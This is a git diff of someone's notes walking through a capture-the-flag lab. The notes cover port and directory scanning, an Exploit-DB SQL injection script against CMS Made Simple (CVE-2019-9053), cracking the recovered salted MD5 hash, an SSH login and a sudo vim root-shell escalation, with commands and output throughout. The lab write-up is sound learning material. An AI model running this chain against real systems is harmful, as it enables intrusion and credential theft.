@@ -1,92 +1,360 @@
-cve is the id of a well known vulnerability
+NB : cve is the id of a well known vulnerability
 
-exploit db is The Exploit Database is a CVE compliant archive of public exploit>
+exploit db is {The Exploit Database} is a CVE compliant archive of public exploit>
 
 searchsploit 'made simple'
 
 searches Exploit-DB (a database of publicly available exploits) for vulnerabili>
 
-loacate : this cmnd locate the repository of a file
+
+lets use nmap to check the machine services 
 
 
-lets use gobuster to know the directories 
-
-gobuster dir -u http://10.10.20.232/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
-
-using gobuster we found this website 
-
-http://10.10.20.232/simple/
-
-lets use it again on the same url 
-
-gobuster dir -u http://10.10.20.232/simple/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
-
-its an effective technique
+{{/////////////////////////
 
 
-/////////
+nmap -sC -sV 10.10.104.36           
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 21:24 UTC
+Nmap scan report for 10.10.104.36
+Host is up (0.17s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.21.180.29
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
-if found thos repositories 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 53.92 seconds
 
-─$ gobuster dir -u http://10.10.20.232/simple/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
+
+/////////////////////////////////////////}
+
+we have ssh running on the highest port : 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+
+looks like we have also an ftp service with a permitted anonymous log in 
+
+
+
+
+
+
+Extra :
+
+////////////////////////////////////////////////////
+this machine is running a version an apache server and the scan says robots.txt reveals a disallowed entry: 
+/openemr-5_0_1_3 (likely an OpenEMR installation, which is medical software with known vulnerabilities).
+
+
+if we search we can find that openemr-5_0_1_3 has 
+CVE-2018-16795 Detail
+Modified
+
+This CVE record has been updated after NVD enrichment efforts were completed. 
+Enrichment data supplied by the NVD may require amendment due to these changes.
+Description
+
+OpenEMR 5.0.1.3 allows Cross-Site Request Forgery (CSRF) via library/ajax and interface/super, 
+as demonstrated by use of interface/super/manage_site_files.php to upload a .php file.
+it may help us here 
+////////////////////////////////////////////////////////////
+
+
+when we check the hint we find this : 
+
+A vulnerability classified as critical was found in CMS Made Simple up to 2.2.8 (Content Management System). 
+Affected by this vulnerability is some unknown functionality of the component News Module.
+ The manipulation of the argument m1_idlist as part of a Parameter leads to a sql injection vulnerability (Time-Based). 
+The CWE definition for the vulnerability is CWE-89.
+ The product constructs all or part of an SQL command using externally-influenced input from an upstream component,
+ but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. 
+As an impact it is known to affect confidentiality, integrity, and availability. The summary by CVE is:
+
+
+////////////////
+
+An issue was discovered in CMS Made Simple 2.2.8. It is possible with the News module, through a crafted URL, to achieve unauthenticated blind time-based SQL injection via the m1_idlist parameter.
+
+//////////////
+
+
+lets try to use it , the cve : CVE-2019-9053
+
+
+its an sqli because the vulnerability make u achieve unauthenticated blind time-based SQL injection via the m1_idlist parameter.
+
+lets use gobuster to find someurls :
+
+/////////////////////////////////////////////
+
+gobuster dir -u http://10.10.104.36/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.10.20.232/simple/
+[+] Url:                     http://10.10.104.36/
 [+] Method:                  GET
 [+] Threads:                 10
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
 [+] Negative Status codes:   404
 [+] User Agent:              gobuster/3.6
 [+] Timeout:                 10s
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/modules              (Status: 301) [Size: 321] [--> http://10.10.20.232/simple/modules/]
-/uploads              (Status: 301) [Size: 321] [--> http://10.10.20.232/simple/uploads/]
-/doc                  (Status: 301) [Size: 317] [--> http://10.10.20.232/simple/doc/]
-/admin                (Status: 301) [Size: 319] [--> http://10.10.20.232/simple/admin/]
-/assets               (Status: 301) [Size: 320] [--> http://10.10.20.232/simple/assets/]
-/lib                  (Status: 301) [Size: 317] [--> http://10.10.20.232/simple/lib/]
-Progress: 3241 / 220560 (1.47%)
+/.htaccess            (Status: 403) [Size: 296]
+/.hta                 (Status: 403) [Size: 291]
+/.htpasswd            (Status: 403) [Size: 296]
+/index.html           (Status: 200) [Size: 11321]
+/robots.txt           (Status: 200) [Size: 929]
+/server-status        (Status: 403) [Size: 300]
+/simple               (Status: 301) [Size: 313] [--> http://10.10.104.36/simple/]
+Progress: 4746 / 4747 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+//////////////////////////////////////////////////
+
+we found one : http://10.10.104.36/simple/ 
+
+lets use gobuseter on it : 
 
 
+////////////////////////////
 
-lets navigate to exploit db to find a payload 
-
-https://www.exploit-db.com/exploits/46635
-
-lets download and move the script : sudo mv ~/Downloads/46635.py ~/Desktop/tryhackme/simplectf
-
-ok this is the python payload for sql injection 
-///////
-
-python3 46635.py -h 
-Usage: 46635.py [options]
-
-Options:
-  -h, --help            show this help message and exit
-  -u URL, --url=URL     Base target uri (ex. http://10.10.10.100/cms)
-  -w WORDLIST, --wordlist=WORDLIST
-                        Wordlist for crack admin password
-  -c, --crack           Crack password with wordlist
-                                                                                             
-┌──(Abad㉿kali)-[~/Desktop/tryhackme/simplectf]
-└─$ 
-
-
-
-////////
-
-
-
-lets give the script a shot 
-
-python 46635.py -u http://10.10.7.241/simple/ --crack -w /usr/share/wordlists/rockyou.txt
-
-
+ gobuster dir -u http://10.10.104.36/simple/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.104.36/simple/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 298]
+/.htaccess            (Status: 403) [Size: 303]
+/.htpasswd            (Status: 403) [Size: 303]
+/admin                (Status: 301) [Size: 319] [--> http://10.10.104.36/simple/admin/]
+/assets               (Status: 301) [Size: 320] [--> http://10.10.104.36/simple/assets/]
+/doc                  (Status: 301) [Size: 317] [--> http://10.10.104.36/simple/doc/]
+/index.php            (Status: 200) [Size: 19913]
+/lib                  (Status: 301) [Size: 317] [--> http://10.10.104.36/simple/lib/]
+/modules              (Status: 301) [Size: 321] [--> http://10.10.104.36/simple/modules/]
+/tmp                  (Status: 301) [Size: 317] [--> http://10.10.104.36/simple/tmp/]
+/uploads              (Status: 301) [Size: 321] [--> http://10.10.104.36/simple/uploads/]
+Progress: 4746 / 4747 (99.98%)
+===============================================================
+Finished
+===============================================================
 
 
+////////////////////////
 
 
+we found some intresting url , and upload , login etcc...
+
+
+lets use the python script of the cve on the website : 
+
+by fixing the script and using it on the main url we found some credentioals :
+
+{/////////////////////
+
+ python3 46635.py -u http://10.10.104.36/simple/
+
+
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+
+
+//////////////////////
+
+nb: the payload is in exploit db 
+
+first lets identify the password hashing type :
+
+lets go here and do it : https://hashes.com/en/tools/hash_identifier
+
+we found this : 0c01f4468bd75d7a84c7eb73846e8d96 - Possible algorithms: MD5 
+
+so lets check the parameters for combining a hash and a salt in hashcat to crack the password using this list 
+usr/share/seclists/Passwords/Common-Credentials/best110.txt
+
+
+the parameters for md5 with salt are -m 20 check this website : https://hashcat.net/wiki/doku.php?id=example_hashes
+
+the cmnd is hashcat -m 20 '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2' /usr/share/seclists/Passwords/Common-Credentials/best110.txt
+
+i combimned the hash and the salt :
+
+the final result 
+
+//////////////////////
+
+0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret  
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 20 (md5($salt.$pass))
+Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
+Time.Started.....: Fri May  9 22:33:59 2025 (0 secs)
+Time.Estimated...: Fri May  9 22:33:59 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/seclists/Passwords/Common-Credentials/best110.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     4807 H/s (0.03ms) @ Accel:128 Loops:1 Thr:64 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 110/110 (100.00%)
+Rejected.........: 0/110 (0.00%)
+Restore.Point....: 0/110 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 000000 -> zxczxc
+
+Started: Fri May  9 22:33:45 2025
+Stopped: Fri May  9 22:34:01 2025
+
+///////////////////////
+
+so the password is {secret}
+Username found: mitch
+
+
+lets use this credentials to login in ssh 
+
+to make shur that we login in ssh we need to specify the ssh port this time cause its not default otherwise we
+cant login : 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+
+the cmnd is :  ssh -p 2222 mitch@10.10.104.36 
+
+now we logged in : 
+
+{/////////////////////
+
+
+ssh -p 2222 mitch@10.10.104.36
+The authenticity of host '[10.10.104.36]:2222 ([10.10.104.36]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.104.36]:2222' (ED25519) to the list of known hosts.
+mitch@10.10.104.36's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ whoami
+mitch
+$ 
+
+
+////////////////////////////}
+
+
+here u find the flag : 
+
+////////////
+
+$ pwd     
+/home/mitch
+$ cat user.txt
+G00d j0b, keep up!
+$ 
+
+////////////////
+
+
+there is another user here :
+/////////////////////
+
+ $ ls
+mitch  sunbath
+$
+
+////////////////////
+
+now lets escalate our priviliges : 
+
+we see that we have acces on vim as a root :
+
+/////////////////////
+
+ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+$ 
+
+////////////////////
+
+lets go to this website https://gtfobins.github.io/gtfobins/vim/#sudo 
+
+find a vim sudo cmnd that escalates the priviliges , and we found it :
+
+sudo vim -c ':!/bin/sh'
+
+What Does sudo vim -c ':!/bin/sh' Do?
+
+This command is a privilege escalation technique that exploits vim (a text editor) to spawn a root shell if misconfigured. Here's how it works:
+ Breakdown of the Command
+
+    sudo vim → Runs vim with root privileges (if the user has sudo access).
+
+    -c ':!/bin/sh' → Executes a Vim command (:!) to launch /bin/sh (a shell) from inside Vim.
+
+now that we are root lets find the flag 
+
+///////////////
+
+# whoami
+root
+# find / -type f -name "root.txt"                                   
+find: ‘/run/user/108/gvfs’: Permission denied
+/root/root.txt
+# 
+there it is 
+
+////////////////
+
+# cat /root/root.txt
+W3ll d0n3. You made it!
+# 
+
+////////////////
